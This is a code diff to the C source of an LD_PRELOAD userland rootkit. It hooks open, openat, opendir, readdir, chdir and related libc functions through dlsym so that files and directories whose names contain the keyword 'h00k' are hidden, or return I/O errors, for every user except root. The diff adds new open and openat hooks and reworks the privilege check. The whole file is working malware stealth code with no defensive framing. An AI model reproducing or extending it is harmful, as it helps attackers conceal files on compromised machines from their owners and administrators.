@@ -18,26 +18,68 @@
 #define keyword "h00k"
 #define permission "root"
 
+//??
+int (*old_open)(const char *pathname, int flags, mode_t mode);
+int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
 
 //directory stuff
 DIR *(*old_opendir)(const char *name);
 DIR *(*old_opendir64)(const char *name);
 struct dirent *(*old_readdir)(DIR *dirp);
-int *(*old_chdir)(const char *path);
-int *(*old_fchdir)(int fd);
-
+int (*old_chdir)(const char *path);
+int (*old_fchdir)(int fd);
 
 
 int ismaster(){
     //TODO find a good way to verify that master is master
-   struct passwd *user = getpwuid(getuid());
-   
-   if(strstr(user->pw_name,permission)){
-	return 0;
-    }
+    //char *username;
+    //username = malloc(256);
+    //username = getlogin();
 
+   //if(strcmp(username,permission) == 0){
+     //  free(username);
+//	return 0;
+  //  }
+
+    //free(username);
+    if(getuid() == 0)
+	return 0;
+    
     return 1;
 
+}
+
+int open(const char *pathname, int flags, mode_t mode){
+    
+    if(!old_open){
+	old_open = dlsym(RTLD_NEXT,"open");
+    }
+
+    if(strstr(pathname, keyword)){
+	if(ismaster() != 0){
+	    errno = EIO;
+	    return -1;
+	}
+    }
+    
+    return old_open(pathname, flags, mode);
+
+}
+
+int openat(int dirfd, const char *pathname, int flags, mode_t mode){
+    
+    if(!old_openat){
+	old_openat = dlsym(RTLD_NEXT,"openat");
+    }
+
+    if(strstr(pathname, keyword)){
+	if(ismaster() != 0){
+	    errno = EIO;
+	    return -1;
+	}
+    }
+
+    return old_openat(dirfd, pathname, flags, mode);
 }
 
 //hook the opendir function
@@ -47,8 +89,8 @@ DIR *opendir(const char *name){
 	old_opendir = dlsym(RTLD_NEXT,"opendir");
     }
 
-    if(ismaster() != 0){
-	if(strstr(name,keyword)){
+    if(strstr(name, keyword)){
+	if(ismaster() != 0){
 	    errno = EIO;
 	    return NULL;
 	}
@@ -62,8 +104,8 @@ DIR *opendir64(const char *name){
 	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
     }
    
-    if(ismaster() != 0){
-	if(strstr(name,keyword)){
+    if(strstr(name, keyword)){
+	if(ismaster() != 0){
 	    errno = EIO;
 	    return NULL;
 	}
@@ -82,15 +124,14 @@ struct dirent *readdir(DIR *dirp){
     }
     
     dir = old_readdir(dirp);
-    
-    //is user allowed to see these juicy files?
-    if(ismaster() == 0){
-	return dir;
-    }
-    
 
     //hides via keyword. Needs more testing
-    if(strstr(dir->d_name,keyword)) return 0;
+    if(strstr(dir->d_name, keyword)){
+	if(ismaster() != 0){
+	    errno = EIO;
+	    return 0;
+	}
+    }
 
     //printf("hit\n");
     return dir;
@@ -99,17 +140,18 @@ struct dirent *readdir(DIR *dirp){
 
 int chdir(const char *path){
     
+    //TODO vim is breaking here and in fchdir, we need to fix that :(
+
     if(!old_chdir){
 	old_chdir = dlsym(RTLD_NEXT,"chdir");
     }
 
-    if(ismaster() != 0){
-	if(strstr(path,keyword)){
+    if(strstr(path, keyword)){
+	if(ismaster() != 0){
 	    errno = EIO;
 	    return -1;
 	}
     }
-
     return old_chdir(path);
 
 }
@@ -119,9 +161,8 @@ int fchdir(int fd){
     if(!old_fchdir){
 	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
     }
-
+    
     return old_fchdir(fd);
-
 }
 
 
